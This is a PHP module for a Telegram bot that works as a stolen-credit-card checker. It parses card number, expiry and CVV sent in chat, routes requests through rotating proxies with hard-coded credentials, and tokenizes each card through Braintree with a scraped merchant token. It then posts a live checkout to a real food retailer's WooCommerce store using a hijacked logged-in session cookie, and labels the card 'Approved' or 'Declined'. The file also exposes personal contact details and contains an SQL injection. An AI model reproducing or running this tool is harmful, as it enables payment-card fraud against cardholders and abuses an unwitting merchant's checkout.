<?php
ignore_user_abort(true); // Ejecutar el script en segundo plano incluso si el usuario cierra la conexión

/*
///==[Stripe CC Checker Commands]==///
/ss creditcard - Checks the Credit Card
*/

$query = "SELECT * FROM users WHERE user_id='$userId'";
$result = mysqli_query($link, $query);

// Verificar si el usuario no está registrado
if (mysqli_num_rows($result) == 0) {
    // No hacer nada si el usuario no está registrado
    return;
}



$cmd = trim($message);
if ($cmd === '/lo') {
    $content = [
        'chat_id' => $chat_id,
        'text' => "
━━━━━「𝗨𝗹𝘁𝗿𝗮 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿」 ━━━━
<i>♻️ Comando</i> <i>/lo</i>
<i>🔰 Formato:</i> <code>cc|mm|yy|cvv</code>
<i>➤ Gateway:</i> <code>braintree</code>
━━━━━「𝗨𝗹𝘁𝗿𝗮 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿」 ━━━━",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ];

    bot('sendmessage', $content);
    exit;
}
////////////====[MUTE]====////////////
if(strpos($message, "/lo ") === 0 || strpos($message, ".lo ") === 0){   


        $messageidtoedit1 = 
          bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id
         
        ]);
   
        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        $starttim = microtime(true);
        
        $starttime = intval(microtime(true) - $starttim);
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        bot('editMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$messageidtoedit,
  'text'=>"
  <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
 <i><b>➜[Credit Card] »</b></i><code>$lista</code>
 <i><b>➜[Loading]....■■□□□□□□□□ →20%</b></i>
 <i><b>➜[Time] » → $starttime</b></i>sg ",
  'disable_web_page_preview'=>'true',
  'parse_mode'=>'html'
    ]);

            ###CHECKER PART###  
            $zip = rand(10001,90045);
            $time = rand(30000,699999);
            $rand = rand(0,99999);
            $pass = rand(0000000000,9999999999);
            $email = substr(md5(mt_rand()), 0, 7);
            $name = substr(md5(mt_rand()), 0, 7);
            $last = substr(md5(mt_rand()), 0, 7);
            $starttime = intval(microtime(true) - $starttim);
        bot('editMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$messageidtoedit,
  'text'=>"
  <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>$lista</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → $starttime</b></i>sg ",
  'disable_web_page_preview'=>'true',
  'parse_mode'=>'html'
    ]);
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: m.stripe.com',
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.5',
            'Content-Type: text/plain;charset=UTF-8',
            'Origin: https://m.stripe.network',
            'Referer: https://m.stripe.network/inner.html'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            $res = curl_exec($ch);
            $muid = trim(strip_tags(capture($res,'"muid":"','"')));
            $sid = trim(strip_tags(capture($res,'"sid":"','"')));
            $guid = trim(strip_tags(capture($res,'"guid":"','"')));
            $info = curl_getinfo($ch);

bot('editMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$messageidtoedit,
 'text'=>"
 <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>$lista</code>
<i><b>➜[Loading]...■■■■■□□□□□ →50%</b></i>
<i><b>➜[Time] » → $starttime</b></i>sg ",
  'disable_web_page_preview'=>'true',
  'parse_mode'=>'html'
    ]);
         //==================[BIN LOOK-UP]======================//
         $fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$cc), true);
         $bin = $fim["bin"];
         $brand = $fim["brand"];
         $country = $fim["country"];
         $country_name = $fim["country_name"];
         $country_flag = $fim["country_flag"];
         $country_currencies = $fim["country_currencies"];
         $bank = $fim["bank"];
         $level = $fim["level"];
         $type = $fim["type"];
         $starttime = intval(microtime(true) - $starttim);
              bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$messageidtoedit,
    'text'=>"
 <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>$lista</code>
<i><b>➜[Loading]...■■■■■■□□□□ →70%</b></i>
<i><b>➜[Time] » → $starttime</b></i>sg ",
    'disable_web_page_preview'=>'true',
    'parse_mode'=>'html'
      ]);
     # <==[Sección de proxies]==>
$Websharegay = rand(0,10);
$rp1 = array(
1 => 'zqkeryqm-rotate:vvkccjnuo8z7',
2 => 'zqkeryqm-'.$Websharegay.':vvkccjnuo8z7',
); 
$rpt = array_rand($rp1);
$rotate = $rp1[$rpt];
$ip = array(
1 => 'socks5://p.webshare.io:1080',
2 => 'http://p.webshare.io:80',
); 
$socks = array_rand($ip);
$socks5 = $ip[$socks];
$url = "https://api.ipify.org/";   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "𝐏𝐫𝐨𝐱𝐲 𝐋𝐢𝐯𝐞 ✅";
}
if (empty($ip1)){
$ip = "𝐃𝐞𝐚𝐝 𝐏𝐫𝐨𝐱𝐲![".$rotate."]";
}
$starttime = intval(microtime(true) - $starttim);
         bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"
 <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>$lista</code>
<i><b>➜[Loading]...■■■■■■■■□□ →90%</b></i>
<i><b>➜[Time] » → $starttime</b></i>sg ",
            'disable_web_page_preview'=>'true',
            'parse_mode'=>'html'
              ]);
# == [Fin de sección de proxies]  ==>
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: */*',
    'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
    'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODU5Mjk1MjQsImp0aSI6IjY1Y2QxYWVkLWEyZTUtNDM1MS1hZDVhLTcwNDE5ZjU1M2Y3OSIsInN1YiI6IjI4czR5ZGczNGZraGNuNzIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjI4czR5ZGczNGZraGNuNzIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiV2hvbGVzb21lWXVtQnJhbmRzX2luc3RhbnQifX0.0JmwizOFAHFkDG4Xoj3Qf37LB9MbV8HB3gzS6nBQTgr8HEofmmxSEmu0NkdqMLLLPQeFKG3RJ2RGtGuVtlGxVQ',
    'Braintree-Version: 2018-05-10',
    'Cache-Control: no-cache',
    'Connection: keep-alive',
    'Content-Type: application/json',
    'Origin: https://assets.braintreegateway.com',
    'Pragma: no-cache',
    'Referer: https://assets.braintreegateway.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: cross-site',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"c0d003d1-5dc6-4654-86c9-0c76fca6f639"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"10800","streetAddress":"588"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$response1 = curl_exec($ch);

$result2=gzdecode($response1);
$req=json_decode($result2);
$id=$req->data->tokenizeCreditCard->token;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.wholesomeyumfoods.com/?wc-ajax=checkout&nocache=1685843286461');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.wholesomeyumfoods.com',
    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: es-ES,es;q=0.9,en;q=0.8',
    'cache-control: no-cache',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.wholesomeyumfoods.com',
    'pragma: no-cache',
    'referer: https://www.wholesomeyumfoods.com/checkout/',
    'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, '__adblocker=false; _wp_session=e90c8ce2e913754a4ce2de12211af0da%7C%7C1685844870%7C%7C1685844510; user_country=US; _gcl_au=1.1.1015468944.1685843070; _gid=GA1.2.1350971002.1685843070; usprivacy=1---; _pbjs_userid_consent_data=3524755945110770; pys_session_limit=true; pys_start_session=true; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://www.wholesomeyumfoods.com/; last_pysTrafficSource=direct; last_pys_landing_page=https://www.wholesomeyumfoods.com/; _fbp=fb.1.1685843072562.7735385492; cppro-ft=true; cppro-ft-style=true; cppro-ft-style-temp=true; _fbp=fb.1.1685843072562.7735385492; pys_fb_event_id={%22AddToCart%22:%22TuV5q5OthhTNZA6AhT4EZIpf8rlTP4shrluw%22}; woocommerce_items_in_cart=1; language=en_US; ledgerCurrency=USD; _route_pa_sid=363b8489-45e9-4d8b-b588-e065f1edc122; _route_pa_session_start=1685843081478; apay-session-set=URBQ%2F1CvueS0h9ewV3UnIAOThv96MiCnaFcCe5A%2FA%2FqiHid319hOXdkK%2Bo5YVPE%3D; _pin_unauth=dWlkPU5qQTBPRFl3T1RrdE5tRmpZeTAwWVRZekxUZzJZekV0WkdOaE9ERmtaRGxtWVdSbA; AMZN-Token=v2FweLxCb3lzVzBSdmt2ZXptbXJxdXd5ajk5LzdxVWxOekd5ZG1HRFRyUVJMSU5iZDNYc3VBSEZKOWNXVW1MUExJQ0ViNnhHaTJ1N1VsSHlQM1hJTFZ1VitwU1h1K2F5RXF4UFpET3JrUDBRc3NDWFpUQmRFeUlTOStudzY4a0crUzBIczcxZmFVYUI4cFNBNmZFUjJWbVN3VDcxWGhhYXIrbEg4Q1hxaExGSk1ZcE1zOHhEUDUrQkdzcXVQVlFjPWJrdgFiaXZ4IFZWcEU3Nys5WCsrL3ZlKy92ZSsvdldORDc3Kzk3Nys5/w==; woocommerce_cart_hash=639c59b037b448baa2a52902e7ce3489; wordpress_logged_in_5b17669386d4a5814e90d15c5e0bc527=juan.jose%7C1687052717%7CshD7HoVEh1sDq8DxcDkzx1ztnEl4fGSMNYHsO4bh4hI%7Cc61c78b355911a631f5dd448a0c23b9db76ff662c5ec2c54ad85df055c3121ee; wp_woocommerce_session_5b17669386d4a5814e90d15c5e0bc527=59947%7C%7C1686015870%7C%7C1686012270%7C%7C8a77591a57456be3562f597e1690713c; _ga=GA1.1.1333322326.1685843070; _ga_Q7LLQBZPNL=GS1.1.1685843070.1.1.1685843130.60.0.0; _derived_epik=dj0yJnU9eXlZN1lJRGtfTTJyTFU4aklWcTktTW1xcnY4Ykc4YXEmbj01SW9QTTBURktsaGhtZkFRcmVCR3l3Jm09NCZ0PUFBQUFBR1I3N0xvJnJtPTQmcnQ9QUFBQUFHUjc3TG8mc3A9Mg');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'cfw_displayed_order_bump%5B%5D=315351&cfw_displayed_order_bump%5B%5D=460771&cfw-promo-code=&billing_email=frangelotorrez1%40gmail.com&shipping_first_name=Juan&shipping_last_name=Jose&shipping_company=&shipping_address_1=588&shipping_address_2=&shipping_country=US&shipping_postcode=10800&shipping_state=FL&shipping_city=Ojeda&shipping_phone=04125594378&shipping_method%5B0%5D=tree_table_rate%3A10%3A09b14554_expedited_shipping_2_to_4_business_days_usps_pm_fr_env&cfw-promo-code-mobile=&payment_method=braintree_cc&braintree_cc_nonce_key='.$id.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%2238b3972e3ac51bfdff187b092a4df62b%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2268a335540993526a4eb0588ea4715476%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F28s4ydg34fkhcn72%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F28s4ydg34fkhcn72%22%7D%2C%22merchantId%22%3A%2228s4ydg34fkhcn72%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%2228s4ydg34fkhcn72%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22MasterCard%22%2C%22Visa%22%2C%22American+Express%22%2C%22Discover%22%2C%22JCB%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22Wholesome+Yum+Brands%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODU5MjkyNDksImp0aSI6IjQwYWE2MGRlLTNjYzUtNGQyNy1iYzQ1LTBiM2JlZjk1Y2JjZCIsInN1YiI6IjI4czR5ZGczNGZraGNuNzIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjI4czR5ZGczNGZraGNuNzIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.lv0PQzKYgnL-yaZqMV3RP2Z_G3zrBT7LzJMg_qdYAdTfZhYWTmhIZT_ICLqEDDmtnwIlvynuwFmGTgVsuilKPg%22%2C%22paypalClientId%22%3A%22AT0h1Qzl56A7MXRJQqVfjf-0uNZ79362CQXRjP57Y4PwiR5YrHjxi8yNSNXQciTn4bUxuSC5sGXCQSM1%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Wholesome+Yum+Brands%22%2C%22clientId%22%3A%22AT0h1Qzl56A7MXRJQqVfjf-0uNZ79362CQXRjP57Y4PwiR5YrHjxi8yNSNXQciTn4bUxuSC5sGXCQSM1%22%2C%22privacyUrl%22%3A%22https%3A%2F%2Fwww.wholesomeyumfoods.com%2Fprivacy-policy%2F%22%2C%22userAgreementUrl%22%3A%22https%3A%2F%2Fwww.wholesomeyumfoods.com%2Fterms-and-conditions%2F%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22WholesomeYumBrands_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=%7B%22device_session_id%22%3A%2238b3972e3ac51bfdff187b092a4df62b%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2268a335540993526a4eb0588ea4715476%22%7D&braintree_googlepay_nonce_key=&braintree_googlepay_device_data=%7B%22device_session_id%22%3A%2238b3972e3ac51bfdff187b092a4df62b%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2268a335540993526a4eb0588ea4715476%22%7D&braintree_applepay_nonce_key=&braintree_applepay_device_data=%7B%22device_session_id%22%3A%2238b3972e3ac51bfdff187b092a4df62b%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2268a335540993526a4eb0588ea4715476%22%7D&g-recaptcha-response=&ship_to_different_address=1&bill_to_different_address=same_as_shipping&billing_first_name=Juan&billing_last_name=Jose&billing_company=&billing_address_1=588&billing_address_2=&billing_country=US&billing_postcode=10800&billing_state=FL&billing_city=Ojeda&billing_phone=04125594378&cfw_displayed_order_bump%5B%5D=315351&cfw_displayed_order_bump%5B%5D=460771&woocommerce-process-checkout-nonce=8b9a5036b8&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26nocache%3D1685843128384&cfw_update_cart=false&pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined&pys_browser_time=19-20%7CSaturday%7CJune&pys_landing=https%3A%2F%2Fwww.wholesomeyumfoods.com%2F&pys_source=direct&pys_order_type=normal&last_pys_landing=https%3A%2F%2Fwww.wholesomeyumfoods.com%2F&last_pys_source=direct&last_pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&last_pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined');

$response = curl_exec($ch);
$result = gzdecode($response);
$req2 = json_decode($result);
$errormessage1 = $req2->messages;


// Process the text for Telegram
$processedMessage = html_entity_decode($errormessage1); // Convert HTML entities to their corresponding characters
$errormessage2 = strip_tags($processedMessage); // Remove HTML tags
$parts = explode(':', $errormessage2, 2); // Dividir el mensaje en dos partes en función de los dos puntos
if (count($parts) > 1) {
    $errorMessage = trim($parts[1]); // Tomar la segunda parte y eliminar los espacios en blanco adicionales
} else {
    $errorMessage = $errorMsg; // Si no se encuentra el delimitador ":", mantener el mensaje original
}
$errormessage = trim($errorMessage);


  $starttime = intval(microtime(true) - $starttim);
   bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"
 <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card]»</b></i><code>$lista</code>
<i><b>➜[Loading]...■■■■■■■■■□ →95%</b></i>
<i><b>➜[Time] » → $starttime</b></i>sg ",
                'disable_web_page_preview'=>'true',
                'parse_mode'=>'html'
                  ]);


              
          
          $info = curl_getinfo($ch);
          $time = $info['total_time'];
          $time = substr_replace($time, '',4);
          $enlace = "https://t.me/Azunainfo";
          ###END OF CHECKER PART###
          
 
          $starttime = intval(microtime(true) - $starttim);
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"
 <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>$lista</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → $starttime</b></i>sg ",
                    'disable_web_page_preview'=>'true',
                    'parse_mode'=>'html'
                      ]);
                      $query = "SELECT * FROM users WHERE user_id='$userId'";
                      $result = mysqli_query($link, $query);
                      
                      // Verificar si el usuario está registrado
                      if (mysqli_num_rows($result) > 0) {
                          $row = mysqli_fetch_assoc($result);
                          $rank = $row['status'];
                      }
          if ($req_2['status'] == 'succeeded') {
            bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
'text'=>"
<i>Card ➤</i> <code>$lista</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> $errormessage</code>
<i>Gateway ➤</i> braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>$level -  $type [$country_flag]</code>
<i>Bank ➤</i> <code>$bank</code>
<i>Country ➤</i> <code>$country_name - $country</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>$time</code>sg
<i>User ➤</i> <i>$username</i> [$rank]
<i>Owner by ➤</i> <code> @NadaImportanteZzz</code>",
              'disable_web_page_preview'=>'true',
              'parse_mode'=>'html',
               'reply_markup' => json_encode([
                'inline_keyboard' => [
                [
                ['text' => "𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐑𝐞𝐟𝐞𝐫𝐞𝐧𝐜𝐞", 'url' => "https://t.me/AzunaReferencias"],
                ],
                ],
                'resize_keyboard' => true
                ])
                ]);
              
              }
                   
          else{
            bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"
<i>Card ➤</i> <code>$lista</code>
<i>Status ➤</i> <b>Declined! ❌</b> 
<i>Message ➤</i><code> $errormessage</code>
<i>Gateway ➤</i> Stripe Auth
━━━━━━━━━━━━
<i>Bin ➤</i> <code>$level -  $type [$country_flag]</code>
<i>Bank ➤</i> <code>$bank</code>
<i>Country ➤</i> <code>$country_name - $country</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>$time</code>sg
<i>User ➤</i> <i>$username</i> [$rank]
<i>Owner by ➤</i> <code>@NadaImportanteZzz</code>",
                          'disable_web_page_preview'=>'true',
                          'parse_mode'=>'html',
                          'reply_markup' => json_encode([
                           'inline_keyboard' => [
                           [
                           ['text' => "𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿 𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗶𝗮𝘀", 'url' => "https://t.me/UltraScrapperRefes"],
                           ],
                           ],
                           'resize_keyboard' => true
                           ])
                           ]);
                         
                         }
      }else{
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"<b>PLEASE ENTER VALID CC</b>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true',
            
            
        ]);
      }
}